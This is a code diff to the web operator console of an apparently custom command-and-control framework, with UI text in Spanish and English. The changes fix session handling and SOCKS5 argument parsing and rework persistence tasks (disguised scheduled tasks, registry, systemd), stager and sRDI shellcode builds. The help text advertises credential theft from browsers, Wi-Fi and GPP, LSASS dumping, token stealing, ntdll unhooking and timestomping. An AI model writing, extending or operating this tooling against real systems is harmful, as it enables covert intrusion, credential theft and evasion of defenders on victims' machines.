@@ -2959,7 +2959,7 @@ make agent-mtls C2_HOST=10.2.20.200</pre>
         <input id="socks5-port" type="number" value="1080" min="1" max="65535" style="width:120px">
       </div>
       <div class="form-row">
-        <label style="display:flex;flex-direction:column;gap:2px">Autenticación <span style="font-size:10px;color:var(--text3);font-weight:400">(RFC 1929, opcional)</span></label>
+        <label style="display:flex;flex-direction:column;gap:2px">Autenticación <span style="font-size:10px;color:var(--text3);font-weight:400">(RFC 1929, opcional; Go)</span></label>
         <div style="display:flex;gap:6px">
           <input id="socks5-user" type="text" placeholder="usuario" autocomplete="off" style="width:110px">
           <input id="socks5-pass" type="text" placeholder="contraseña" autocomplete="off" style="flex:1">
@@ -3151,7 +3151,9 @@ let consoleDrafts   = {};        // agentID → string (unsent input draft)
 let consoleCleared  = new Set(); // agentIDs whose console was explicitly cleared (persist across tab close/reopen)
 let sseSource = null;
 let sseReconnecting = false;
+let sseReconnectTimer = null;
 let _appIntervals = [];
+let _sessionGeneration = 0;
 let agentView = 'table';
 let graphPositions = {};
 let iconSizeScale = parseFloat(localStorage.getItem('c2_icon_scale')||'1');
@@ -3464,7 +3466,7 @@ async function runCtxAction(act) {
           {key:'content', label:'Content',       ph:'hidden data…', def:''},
         ], vals => {
           if (!vals.target || !vals.content) { toast('Target and content required','red'); return; }
-          api('POST', `/api/agents/${aid}/task`, {type:'ADS_WRITE', args:vals.target, payload:btoa(vals.content)})
+          api('POST', `/api/agents/${aid}/task`, {type:'ADS_WRITE', args:vals.target, payload:u8ToB64(new TextEncoder().encode(vals.content))})
             .then(r => { if (r?.ok) toast('ADS write queued'); });
         });
       } else if (op === 'del') {
@@ -5215,11 +5217,41 @@ function toggleTheme() {
 
 function doLogout() {
   // Close SSE before clearing token so onerror can't trigger a reconnect loop
+  if (sseReconnectTimer) { clearTimeout(sseReconnectTimer); sseReconnectTimer = null; }
   if (sseSource) { sseSource.close(); sseSource = null; }
   sseReconnecting = false;
+  _sessionGeneration++;
+  pollTimers = {};
   // Clear all recurring intervals so re-login doesn't stack duplicates
   _appIntervals.forEach(id => clearInterval(id));
   _appIntervals = [];
+  closeConsole();
+  fxSessions.clear();
+  psSessions.clear();
+  consoleHistory = {};
+  consoleHistIdx = {};
+  consoleDrafts = {};
+  ishellState = {};
+  selectedAgentIds.clear();
+  agents = [];
+  listeners = [];
+  creds = [];
+  downloads = [];
+  logEntries = [];
+  chatMsgs = [];
+  lastChatID = 0;
+  scanResults = [];
+  _scanSeq = 0;
+  _openTgtScans.clear();
+  targets = [];
+  webhooks = [];
+  reactions = [];
+  stagerState = {running: false, tunnel_active: false, public_url: ''};
+  c2IPs = [];
+  Object.keys(agentSocksPort).forEach(id => delete agentSocksPort[id]);
+  Object.keys(_jumpTaskMap).forEach(id => delete _jumpTaskMap[id]);
+  _chatUnread = 0;
+  clearBadge('chat');
   localStorage.removeItem('c2_session');
   const prevBase = BASE;
   BASE = ''; TOKEN = ''; OPERATOR = '';
@@ -5273,21 +5305,30 @@ function initApp() {
 
 // ── SSE ────────────────────────────────────────────────────────────────────────
 function connectSSE() {
+  if (!TOKEN) return;
   sseReconnecting = false;  // clear guard on every fresh connect attempt
   if (sseSource) sseSource.close();
-  sseSource = new EventSource(`${BASE}/events?token=${encodeURIComponent(TOKEN)}`);
-  sseSource.onopen = () => {
+  const source = new EventSource(`${BASE}/events?token=${encodeURIComponent(TOKEN)}`);
+  sseSource = source;
+  source.onopen = () => {
+    if (sseSource !== source) return;
     document.getElementById('conn-dot').className = 'ok';
     document.getElementById('conn-text').textContent = 'Connected';
   };
-  sseSource.onerror = () => {
+  source.onerror = () => {
+    if (sseSource !== source || !TOKEN) { source.close(); return; }
     document.getElementById('conn-dot').className = '';
     document.getElementById('conn-text').textContent = 'Disconnected';
-    if (sseReconnecting) return;  // already queued, don't stack timers
+    if (sseReconnectTimer) return;  // already queued, don't stack timers
     sseReconnecting = true;
-    setTimeout(() => { sseReconnecting = false; connectSSE(); }, 3000);
+    sseReconnectTimer = setTimeout(() => {
+      sseReconnectTimer = null;
+      sseReconnecting = false;
+      if (sseSource === source && TOKEN) connectSSE();
+    }, 3000);
   };
-  sseSource.onmessage = e => {
+  source.onmessage = e => {
+    if (sseSource !== source) return;
     try {
       const ev = JSON.parse(e.data);
       handleSSE(ev);
@@ -5303,10 +5344,14 @@ function handleSSE(ev) {
   } else if (ev.type === 'TASK_RESULT') {
     if (!ev.agent_id) return;
     if (!ev.task_id) return;
-    const targetId = consoleTabs.find(id => id === ev.agent_id);
-    if (targetId) pollResultForAgent(targetId, ev.task_id);
+    // Poll even when the agent has no open console. pollResultForAgent caches
+    // the result so it appears when the console is opened later.
+    pollResultForAgent(ev.agent_id, ev.task_id);
   } else if (ev.type === 'CHAT') {
-    appendChatMsg({sender: ev.sender, message: ev.msg, ts: new Date().toISOString(), id: ev.task_id});
+    const chatID = Number(ev.chat_id) || 0;
+    if (chatID && chatID <= lastChatID) return;
+    if (chatID) lastChatID = chatID;
+    appendChatMsg({sender: ev.sender, message: ev.msg, timestamp: ev.timestamp || new Date().toISOString(), id: chatID});
     if (!isChatVisible()) updateBadge('chat');
   } else if (ev.type === 'AGENT_ADMIN') {
     // getsystem succeeded — mark agent as admin and refresh views so icon turns red
@@ -5369,7 +5414,7 @@ function showLsassPrompt(ev) {
   try {
     const { filename, agent_id } = JSON.parse(ev.msg);
     const id = 'lsass-prompt-' + Date.now();
-    const dl = `/api/agents/${agent_id}/files/${encodeURIComponent(filename)}`;
+    const dl = `${BASE}/api/dl/${encodeURIComponent(agent_id)}/${encodeURIComponent(filename)}?token=${encodeURIComponent(TOKEN)}`;
     const cmd = `pypykatz lsa minidump ${filename}`;
     const div = document.createElement('div');
     div.id = id;
@@ -5418,6 +5463,10 @@ async function api(method, path, body, raw=false) {
   };
   if (body instanceof FormData) {
     opts.body = body;
+  } else if (body instanceof ArrayBuffer || ArrayBuffer.isView(body) || body instanceof Blob) {
+    // Binary APIs (Donut/sRDI) expect the bytes directly. JSON.stringify on an
+    // ArrayBuffer produces "{}" and silently sends an empty payload.
+    opts.body = body;
   } else if (body !== undefined) {
     opts.headers['Content-Type'] = 'application/json';
     opts.body = JSON.stringify(body);
@@ -5430,6 +5479,11 @@ async function api(method, path, body, raw=false) {
     if (TOKEN) { doLogout(); toast('Sesión expirada — vuelve a conectarte', 'error', 4000); }
   }
   return json;
+}
+
+function artifactDownloadURL(path) {
+  const parts = String(path || '').split('/').filter(Boolean).map(encodeURIComponent).join('/');
+  return `${BASE}/api/dl/${parts}?token=${encodeURIComponent(TOKEN)}`;
 }
 
 // ── Tabs ───────────────────────────────────────────────────────────────────────
@@ -6633,11 +6687,13 @@ function renderAgentGraph() {
         if (graphNodeDragged) { graphNodeDragged = false; return; }
         const a2 = agents.find(x => x.id === a.id);
         if (!a2) return;
-        // If console is open and this agent already has a tab, switch to it
+        // If console is open, only an existing tab may retarget the command
+        // console. Selecting a node without a tab must not desynchronise the
+        // visible console from activeAgent.
         const pane = document.getElementById('console-pane');
         if (pane?.classList.contains('open') && consoleTabs.includes(a.id)) {
           switchConsoleTab(a.id);
-        } else {
+        } else if (!pane?.classList.contains('open')) {
           activeAgent = a2;
         }
         renderAgentGraph();
@@ -7168,7 +7224,9 @@ function renderAgentNetwork() {
     el.onclick = e => {
       e.stopPropagation();
       if (_netDragging) return;
-      activeAgent = agents.find(x=>x.id===a.id)||activeAgent;
+      if (!document.getElementById('console-pane')?.classList.contains('open')) {
+        activeAgent = agents.find(x=>x.id===a.id)||activeAgent;
+      }
       renderAgentNetwork();
     };
     el.addEventListener('contextmenu', e => { e.preventDefault(); e.stopPropagation(); agentContextMenu(e, a.id); });
@@ -7373,11 +7431,16 @@ function agentStatus(a) {
 function selectAgent(id, openConsole = true) {
   if (openConsole) {
     openConsoleFor(id); // switchConsoleTab sets activeAgent correctly
+  } else if (document.getElementById('console-pane')?.classList.contains('open') && consoleShownAgentId) {
+    // A table selection may intentionally avoid opening a tab. Keep commands
+    // targeted at the console that is actually visible in that case.
+    activeAgent = agents.find(a => a.id === consoleShownAgentId) || activeAgent;
   } else {
     activeAgent = agents.find(a => a.id === id);
   }
   document.querySelectorAll('#agents-tbody tr').forEach(tr => tr.classList.remove('selected'));
-  event?.currentTarget?.classList.add('selected');
+  const currentEvent = typeof event !== 'undefined' ? event : null;
+  currentEvent?.currentTarget?.classList.add('selected');
 }
 
 // ── Tabbed console ────────────────────────────────────────────────────────────
@@ -7850,7 +7913,7 @@ const AC_COMMANDS = [
   ['ishell ps','ishell ps — abrir PowerShell interactivo'],
   ['ishell exit','cerrar shell interactiva'],
   // PIVOT
-  ['socks5 start','socks5 start <port> [user:pass] — proxy SOCKS5 (auth opcional, RFC 1929)'],
+  ['socks5 start','socks5 start <port> — proxy SOCKS5 (sin auth en Rust/C/Nim)'],
   ['socks5 stop','cerrar proxy SOCKS5'],
   ['socks','socks <port> [user:pass] — proxy SOCKS5 (auth opcional, RFC 1929)'],
   ['socks start','socks start <port> [user:pass] — proxy SOCKS5'],
@@ -8222,7 +8285,7 @@ function consoleAcHighlight(newIdx) {
 
 function consoleKey(e) {
   const input = document.getElementById('console-input');
-  const id = activeAgent?.id;
+  const id = consoleShownAgentId || activeAgent?.id;
   if (!id) return;
 
   // Autocomplete navigation
@@ -8461,7 +8524,7 @@ ${isWin ? `
 <span class="console-section">PIVOT / TUNNEL</span>
   socks &lt;port&gt; [user:pass]          SOCKS5 proxy on agent (Go agent)
   socks stop
-  socks5 start &lt;port&gt;               SOCKS5 proxy on agent (Rust agent)
+  socks5 start &lt;port&gt;               SOCKS5 proxy on agent (no auth on Rust/C/Nim)
   socks5 stop
   rsocks start [port] [user:pass]   Reverse SOCKS5: agent connects to C2 (useful behind NAT)
   rsocks stop
@@ -8623,7 +8686,7 @@ ${isWin ? `
 <span class="console-section">PIVOT / TUNNEL</span>
   socks &lt;port&gt; [user:pass]          SOCKS5 proxy en el agente (Go agent)
   socks stop
-  socks5 start &lt;port&gt;               SOCKS5 proxy en el agente (Rust agent)
+  socks5 start &lt;port&gt;               SOCKS5 proxy en el agente (sin auth en Rust/C/Nim)
   socks5 stop
   rsocks start [port] [user:pass]   Reverse SOCKS5: el agente conecta al C2 (útil tras NAT)
   rsocks stop
@@ -9233,7 +9296,7 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   <span class="console-section">NOTAS</span>
   • run-key escribe en HKCU (sin privilegios de admin)
   • persist task requiere que el agente esté en disco con path accesible
-  • Solo Rust agent`,
+  • Go/Nim agent; en Linux usa systemd o cron`,
 
   'socks': `<b>socks</b> — iniciar proxy SOCKS5 en el agente (Go agent)
 
@@ -9257,13 +9320,13 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   'socks5': `<b>socks5</b> — alias de <b>socks</b>; iniciar proxy SOCKS5 en el agente
 
   <span class="console-section">USO</span>
-  socks5 start &lt;puerto&gt; [usuario:contraseña]
+  socks5 start &lt;puerto&gt; (sin auth en Rust/C/Nim; auth en Go)
   socks5 stop
-  socks5 &lt;puerto&gt; [usuario:contraseña]    (forma corta)
+  socks5 &lt;puerto&gt;                         (forma corta)
 
   <span class="console-section">EJEMPLOS</span>
   socks5 start 1080                  → SOCKS5 sin auth
-  socks5 start 1080 alice:s3cret     → SOCKS5 con auth RFC 1929
+  socks5 start 1080 alice:s3cret     → auth RFC 1929 solo en Go
   socks5 stop                        → cerrar proxy
 
   <span class="console-section">PROXYCHAINS</span>
@@ -10149,7 +10212,7 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   <span class="console-section">NOTES</span>
   • run-key writes to HKCU (no admin privileges required)
   • persist task requires agent to be on disk with accessible path
-  • Rust agent only`,
+  • Go/Nim agents; Linux uses systemd or cron`,
 
   'socks': `<b>socks</b> — start SOCKS5 proxy on agent (Go agent)
 
@@ -10173,13 +10236,13 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   'socks5': `<b>socks5</b> — alias for <b>socks</b>; start SOCKS5 proxy on agent
 
   <span class="console-section">USAGE</span>
-  socks5 start &lt;port&gt; [user:password]
+  socks5 start &lt;port&gt; (no auth on Rust/C/Nim; auth on Go)
   socks5 stop
-  socks5 &lt;port&gt; [user:password]    (short form)
+  socks5 &lt;port&gt;                         (short form)
 
   <span class="console-section">EXAMPLES</span>
   socks5 start 1080                  → SOCKS5 without auth
-  socks5 start 1080 alice:s3cret     → SOCKS5 with RFC 1929 auth
+  socks5 start 1080 alice:s3cret     → RFC 1929 auth on Go only
   socks5 stop                        → close proxy
 
   <span class="console-section">PROXYCHAINS</span>
@@ -10469,10 +10532,60 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   • Agent keeps running on the target`,
 };
 
+const CMD_EXTRA_HELP = {
+  sysinfo: 'sysinfo — mostrar información completa del agente',
+  search: 'search [root] <pattern> — buscar archivos recursivamente',
+  timestomp: 'timestomp <file> [date|ref] — modificar timestamps MACB',
+  'browser-creds': 'browser-creds — extraer credenciales guardadas del navegador',
+  browsercreds: 'browsercreds — alias de browser-creds',
+  bcreds: 'bcreds — alias de browser-creds',
+  'gpp-passwords': 'gpp-passwords — buscar contraseñas GPP en SYSVOL',
+  gpp: 'gpp — alias de gpp-passwords',
+  gpppw: 'gpppw — alias de gpp-passwords',
+  'wifi-creds': 'wifi-creds — extraer credenciales WiFi guardadas',
+  wifi: 'wifi — alias de wifi-creds',
+  wificreds: 'wificreds — alias de wifi-creds',
+  'session-creds': 'session-creds — extraer credenciales de sesiones guardadas',
+  sessioncreds: 'sessioncreds — alias de session-creds',
+  screds: 'screds — alias de session-creds',
+  'session-gopher': 'session-gopher — extraer credenciales de sesiones',
+  sessiongopher: 'sessiongopher — alias de session-gopher',
+  sgopher: 'sgopher — alias de session-gopher',
+  'gpp-hunt': 'gpp-hunt — buscar GPP en los shares SYSVOL del dominio',
+  gpphunt: 'gpphunt — alias de gpp-hunt',
+  'ntdll-unhook': 'ntdll-unhook — restaurar ntdll desde una copia limpia',
+  'unhook-ntdll': 'unhook-ntdll — alias de ntdll-unhook',
+  unhook: 'unhook — alias de ntdll-unhook',
+};
+
 function getCmdHelp(key, isWin) {
+  const normalized = String(key || '').trim().toLowerCase();
   const tbl = helpLang === 'es' ? CMD_DETAIL_HELP_ES : CMD_DETAIL_HELP_EN;
-  const h = tbl[key];
-  return typeof h === 'function' ? h(isWin) : h;
+  let h = tbl[normalized];
+
+  // Subcommands inherit the detailed help of their parent when no dedicated
+  // entry exists (for example: help token whoami, help ads write).
+  if (!h) {
+    const parent = normalized.split(/\s+/)[0];
+    if (parent && parent !== normalized) h = tbl[parent];
+  }
+  if (h) return typeof h === 'function' ? h(isWin) : h;
+
+  // Keep the exact autocomplete registry and `help` command in sync. This
+  // supplies a useful usage line for registered commands whose full prose
+  // help has not got a dedicated entry yet.
+  const acEntry = typeof AC_COMMANDS !== 'undefined'
+    ? AC_COMMANDS.find(([name]) => name === normalized) ||
+      AC_COMMANDS.find(([name]) => name.startsWith(normalized + ' '))
+    : null;
+  const extra = CMD_EXTRA_HELP[normalized];
+  const usage = extra || (acEntry && (acEntry[1] || acEntry[0]));
+  if (usage) {
+    const label = helpLang === 'es' ? 'comando registrado' : 'registered command';
+    return `<b>${esc(normalized)}</b> — ${esc(label)}\n\n` +
+      `<span class="console-section">USAGE</span>\n  ${esc(usage)}`;
+  }
+  return undefined;
 }
 
 // Convert Uint8Array to base64 without spreading (avoids "Maximum call stack size exceeded"
@@ -10756,7 +10869,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           const [target, ...data] = joined.split(' ');
           taskType='ADS_WRITE';
           taskArgs=target;
-          payload=btoa(data.join(' '));
+          payload=u8ToB64(new TextEncoder().encode(data.join(' ')));
           break;
         }
         default: addConsoleOutput('usage: ads list|read|write|del <file>[:<stream>]','',null); return;
@@ -10775,19 +10888,30 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'socks': {
       const [sub, ...rest2] = args.split(' ');
       if (sub === 'stop')  { taskType='SOCKS_STOP'; }
-      else if (sub === 'start') { taskType='SOCKS_START'; taskArgs=rest2.join(' '); }
-      else { taskType='SOCKS_START'; taskArgs=args; }  // socks <port> direct
+      else {
+        const parts = sub === 'start' ? rest2 : [sub, ...rest2];
+        const port = parseInt(parts[0], 10) || 1080;
+        const [user, pass] = (parts[1] || '').split(':', 2);
+        taskType='SOCKS_START';
+        taskArgs=JSON.stringify({port, user:user||'', pass:pass||''});
+      }
       break;
     }
     case 'socks5': {
       const [sub5s, ...rest5s] = args.split(' ');
       if (sub5s === 'stop')  { taskType='SOCKS_STOP'; }
       else if (sub5s === 'start') {
-        // Forward port + optional user:pass (RFC 1929 auth)
+        // JSON is the common SOCKS wire format used by Go, Rust, C and Nim.
         taskType='SOCKS_START';
-        taskArgs = rest5s.length ? rest5s.join(' ') : '1080';
+        const port = parseInt(rest5s[0], 10) || 1080;
+        const [user, pass] = (rest5s[1] || '').split(':', 2);
+        taskArgs = JSON.stringify({port, user:user||'', pass:pass||''});
+      } else {
+        taskType='SOCKS_START';
+        const port = parseInt(sub5s, 10) || 1080;
+        const [user, pass] = (rest5s[0] || '').split(':', 2);
+        taskArgs = JSON.stringify({port, user:user||'', pass:pass||''});
       }
-      else { taskType='SOCKS_START'; taskArgs=args || '1080'; }  // socks5 <port> [user:pass]
       break;
     }
     case 'rev2self': taskType='REV2SELF'; break;
@@ -10836,19 +10960,26 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     }
     case 'persist': {
       const parts2 = args.trim().split(/\s+/);
+      const agentOS = agents.find(a => a.id === agentID)?.os?.toLowerCase() || '';
+      const isLinuxAgent = agentOS.includes('linux');
+      const persistInstallMethod = isLinuxAgent ? 'systemd' : 'registry';
+      const persistTaskMethod = isLinuxAgent ? 'systemd' : 'schtask';
       if (parts2[0] === 'task') {
         const tname = parts2.slice(1).join(' ') || 'WindowsUpdate';
-        taskType='PERSIST'; taskArgs=JSON.stringify({method:'schtask', name:tname});
+        taskType='PERSIST'; taskArgs=JSON.stringify({method:persistTaskMethod, name:tname});
       } else if (parts2[0] === 'rm' || parts2[0] === 'remove') {
         const rname = parts2.slice(1).join(' ') || 'Updater';
-        taskType='PERSIST_RM'; taskArgs=JSON.stringify({name:rname, method:'registry'});
+        taskType='PERSIST_RM'; taskArgs=JSON.stringify({name:rname, method:persistInstallMethod});
       } else {
         taskType='PERSIST';
-        taskArgs = JSON.stringify({method:'registry', name:'Updater'});
+        taskArgs = JSON.stringify({method:persistInstallMethod, name:'Updater'});
       }
       break;
     }
-    case 'download': taskType='DOWNLOAD'; taskArgs=JSON.stringify({path:args}); break;
+    // DOWNLOAD is a plain remote path on Rust/C/Nim agents. Go also accepts
+    // the plain form (and keeps backwards compatibility with the old JSON
+    // envelope), so the console has one wire format for every agent.
+    case 'download': taskType='DOWNLOAD'; taskArgs=args; break;
     case 'minidump': taskType='MINIDUMP'; taskArgs=args ? (args.startsWith('{') ? args : JSON.stringify({pid:parseInt(args,10)})) : '{}'; break;
     case 'lsass-dump-nt': taskType='LSASS_DUMP_NT'; taskArgs=args ? args.trim() : ''; break;
     case 'adcs-request': {
@@ -11337,13 +11468,24 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       break;
     }
     case 'httpivot': {
-      taskType = args.startsWith('stop') ? 'HTTP_PIVOT_STOP' : 'HTTP_PIVOT_START';
-      taskArgs = args.replace(/^start\s*/,'').replace(/^stop\s*/,'');
+      const hp = args.trim().split(/\s+/);
+      if (hp[0] === 'stop') {
+        taskType = 'HTTP_PIVOT_STOP'; taskArgs = '';
+      } else {
+        const port = parseInt(hp[0] === 'start' ? hp[1] : hp[0], 10) || 8888;
+        taskType = 'HTTP_PIVOT_START'; taskArgs = JSON.stringify({port});
+      }
       break;
     }
     case 'tcppivot': {
-      taskType = args.startsWith('stop') ? 'TCP_PIVOT_STOP' : 'TCP_PIVOT_START';
-      taskArgs = args.replace(/^start\s*/,'').replace(/^stop\s*/,'');
+      const tp = args.trim().split(/\s+/);
+      if (tp[0] === 'stop') {
+        taskType = 'TCP_PIVOT_STOP';
+        taskArgs = tp[1] ? JSON.stringify({port: parseInt(tp[1], 10) || 0}) : '';
+      } else {
+        const port = parseInt(tp[0] === 'start' ? tp[1] : tp[0], 10) || 4444;
+        taskType = 'TCP_PIVOT_START'; taskArgs = JSON.stringify({port});
+      }
       break;
     }
     case 'token-store': {
@@ -11356,12 +11498,14 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       else if (sub==='show' || sub==='list') { taskType='TOKEN_STORE_SHOW'; }
       else if (sub==='remove') { taskType='TOKEN_STORE_REMOVE'; taskArgs=JSON.stringify({id:parseInt(rest2[0],10)||1}); }
       else if (sub==='clear') { taskType='TOKEN_STORE_CLEAR'; }
+      else { addConsoleOutput('uso: token-store steal|use|show|remove|clear ...', '', null); return; }
       break;
     }
     case 'screenwatch': {
       const [sw,...sr] = args.split(' ');
       if (sw==='start') { taskType='SCREENWATCH_START'; taskArgs=sr[0]||'30'; }
       else if (sw==='stop') { taskType='SCREENWATCH_STOP'; }
+      else { addConsoleOutput('uso: screenwatch start [secs] | stop', '', null); return; }
       break;
     }
     case 'bof-store': {
@@ -11378,6 +11522,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
           taskType = 'BOF_STORE_LOAD'; taskArgs = bofName;
         } catch(e) { addConsoleOutput('', e.message, null); return; }
       }
+      else { addConsoleOutput('uso: bof-store load|list|unload ...', '', null); return; }
       break;
     }
 
@@ -11557,10 +11702,12 @@ async function pollResult(taskID, agentID, timeoutMs = 120000) {
   const key = `${aid}-${taskID}`;
   if (pollTimers[key]) return;
   pollTimers[key] = true;
+  const generation = _sessionGeneration;
   const deadline = Date.now() + Math.max(10000, Number(timeoutMs) || 120000);
   let resultReceived = false;
-  while (Date.now() < deadline) {
+  while (_sessionGeneration === generation && Date.now() < deadline) {
     await sleep(2000);
+    if (_sessionGeneration !== generation) break;
     try {
       const r = await api('GET', `/api/agents/${aid}/results/${taskID}`);
       if (r.ok && r.data) {
@@ -11630,10 +11777,10 @@ async function pollResult(taskID, agentID, timeoutMs = 120000) {
       }
     } catch(e) {}
   }
-  if (!resultReceived) {
+  if (_sessionGeneration === generation && !resultReceived) {
     addConsoleOutputForAgent(aid, `[!] La tarea #${taskID} no terminó dentro del tiempo de espera; revisa el estado del agente.`, '', null);
   }
-  delete pollTimers[key];
+  if (_sessionGeneration === generation) delete pollTimers[key];
 }
 
 function addConsoleOutputForAgent(agentID, output, err, ts) {
@@ -12090,18 +12237,21 @@ async function unifiedBuild() {
     const stageURL = document.getElementById('stager-stage-url').value.trim();
     if (!stageURL) { toast('Stage URL requerida', 'red'); return; }
     res.innerHTML = '<div class="result-card" style="color:var(--yellow)">Compilando stager C… (~10s)</div>';
-    const r = await api('POST', '/api/build/stager', { stage_url: stageURL });
+    const r = await api('POST', '/api/build/stager', { stage_url: stageURL }, true);
     if (!r.ok) {
-      res.innerHTML = `<div class="result-card" style="color:var(--red)">${esc(r.error || 'Error')}</div>`;
+      let msg = r.statusText || 'Error';
+      try { const e = await r.json(); msg = e.error || msg; } catch(_) {}
+      res.innerHTML = `<div class="result-card" style="color:var(--red)">${esc(msg)}</div>`;
     } else {
-      const d = r.data || {};
-      const exePath = d.exe || d.path || '';
-      const fname   = exePath.split('/').pop() || 'stager.exe';
+      // /api/build/stager returns the compiled executable as octet-stream.
+      // Keep it local to the browser instead of treating the binary as JSON.
+      const blobURL = URL.createObjectURL(await r.blob());
+      const fname   = 'stager.exe';
       res.innerHTML = `<div style="background:rgba(83,130,255,.08);border:1px solid var(--accent);border-radius:6px;padding:10px 12px">
         <div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Stager listo</div>
         <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
           <code style="font-size:11px;color:var(--text);word-break:break-all;flex:1">${esc(fname)}</code>
-          <a href="/api/download?path=${encodeURIComponent(exePath)}" download="${esc(fname)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>
+          <a href="${blobURL}" download="${esc(fname)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>
         </div>
         <div style="font-size:10px;color:var(--text3);line-height:1.6">
           Lenguaje: C (WinHTTP, sin CRT) · ~17 KB<br>
@@ -12140,7 +12290,7 @@ function renderUnifiedResult(resEl, r) {
     html += `<div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Artefacto listo</div>`;
     html += `<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:6px">`;
     html += `<code style="font-size:11px;color:var(--text);word-break:break-all;flex:1">${esc(deliverName)}</code>`;
-    html += `<a href="/api/download?path=${encodeURIComponent(deliverPath)}" download="${esc(deliverName)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>`;
+    html += `<a href="${artifactDownloadURL(deliverPath)}" download="${esc(deliverName)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>`;
     html += `</div>`;
     if (d.stage_url || d.bin_stage) {
       const su = d.stage_url || d.bin_stage;
@@ -12195,18 +12345,6 @@ function opsecCheckboxSimple(cb, badgeId) {
 
 // ── Loaders ───────────────────────────────────────────────────────────────────
 
-function ldrFillURL() {
-  // Auto-fill from active tunnel or C2 host/port fields
-  const stager = document.getElementById('stager-url')?.value ||
-                 document.getElementById('dlv-stageurl')?.value || '';
-  if (stager) { document.getElementById('ldr-url').value = stager; return; }
-  const host = document.getElementById('pay-host')?.value;
-  const port = document.getElementById('pay-port')?.value || '8080';
-  const _lt = document.getElementById('pay-transport')?.value || 'http';
-  const _ls = (_lt === 'https' || _lt === 'mtls') ? 'https' : 'http';
-  if (host) document.getElementById('ldr-url').value = `${_ls}://${host}:${port}`;
-}
-
 let _ldrLang      = 'go';
 let _ldrTransport = 'http';
 
@@ -12241,13 +12379,22 @@ function ldrUpdatePreview() {
 }
 
 function ldrFillURL() {
-  const h = document.getElementById('pay-host')?.value || document.getElementById('ldr-url')?.placeholder || '';
+  const tunnelURL = document.getElementById('stager-tunnel-url')?.textContent?.trim() ||
+                    stagerState?.public_url ||
+                    document.getElementById('dlv-stageurl')?.value?.trim() || '';
+  if (tunnelURL && /^https?:\/\//i.test(tunnelURL)) {
+    const el = document.getElementById('ldr-url');
+    if (el) { el.value = tunnelURL.replace(/\/+$/, ''); ldrUpdatePreview(); }
+    return;
+  }
+  const h = document.getElementById('pay-host')?.value?.trim() || '';
   const port = document.getElementById('pay-port')?.value || '8080';
   const tr = _ldrTransport;
   const scheme = (tr === 'https' || tr === 'mtls') ? 'https' : 'http';
   if (h) {
     const el = document.getElementById('ldr-url');
-    if (el) { el.value = `${scheme}://${h}:${port}`; ldrUpdatePreview(); }
+    const host = h.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
+    if (el) { el.value = `${scheme}://${host}:${port}`; ldrUpdatePreview(); }
   } else {
     toast('No hay tunnel activo ni host configurado', 'red');
   }
@@ -13073,13 +13220,15 @@ async function srdiConvert() {
   const r = await api('POST', '/api/srdi?' + params.toString(), data, true);
 
   if (!r.ok) {
-    res.innerHTML = `<span style="color:var(--accent-red)">Error: ${r.error || r.statusText || 'failed'}</span>`;
+    let msg = r.statusText || 'failed';
+    try { const e = await r.json(); msg = e.error || msg; } catch(_) {}
+    res.innerHTML = `<span style="color:var(--accent-red)">Error: ${esc(msg)}</span>`;
     return;
   }
 
   if (stage) {
     // JSON response with stage token + key
-    const j = r.data;
+    const j = await r.json();
     res.innerHTML = `
       <div style="margin-top:4px">
         <div>✓ ${j.size_kb} KB shellcode staged</div>
@@ -14157,7 +14306,7 @@ function appendChatMsg(m) {
   const el = document.getElementById('chat-messages');
   const div = document.createElement('div');
   div.className = 'chat-msg';
-  div.innerHTML = `<span class="chat-sender">${esc(m.sender||m.operator||'?')}</span><span class="chat-ts">${fmtTime(m.ts||m.created_at)}</span><br><span class="chat-text">${esc(m.message||m.text||'')}</span>`;
+  div.innerHTML = `<span class="chat-sender">${esc(m.sender||m.operator||'?')}</span><span class="chat-ts">${fmtTime(m.ts||m.created_at||m.timestamp)}</span><br><span class="chat-text">${esc(m.message||m.text||'')}</span>`;
   el.appendChild(div);
   el.scrollTop = el.scrollHeight;
 }
@@ -17488,7 +17637,7 @@ function socks5StartConfirm() {
   const user = (document.getElementById('socks5-user').value || '').trim();
   const pass = (document.getElementById('socks5-pass').value || '').trim();
   const auth = (user && pass) ? `${user}:${pass}` : '';
-  const taskArgs = auth ? `${port} ${auth}` : port;
+  const taskArgs = JSON.stringify({port: parseInt(port, 10) || 1080, user, pass});
   const aid = socks5ActiveAgent || activeAgent?.id;
   if (!aid) { closeModal('modal-socks5'); return; }
   api('POST', `/api/agents/${aid}/task`, { type: 'SOCKS_START', args: taskArgs })
@@ -18316,7 +18465,22 @@ async function ipcRun(action) {
 
   const method = document.getElementById('ipc-method').value;
   const lbinFile = document.getElementById('ipc-lbin').value.trim();
-  const lbin = lbinFile ? `payloads/${lbinFile}` : '';  // cwd=bin/, so payloads/ not bin/payloads/
+  let localPayload = null;
+  const needsLocalPayload = Boolean(lbinFile && (
+    action === 'upload' || action === 'upload-exec' ||
+    method === 'rdp-drive' || method === 'rdp-drive-pth'
+  ));
+  if (needsLocalPayload) {
+    try {
+      // /exec runs on this Linux client host, while the selected artifact may
+      // be stored on the teamserver. Materialise a local temporary copy.
+      localPayload = await ipcStageLocalPayload(lbinFile);
+    } catch (e) {
+      toast(`No se pudo preparar el payload local: ${e.message}`, 'error');
+      return;
+    }
+  }
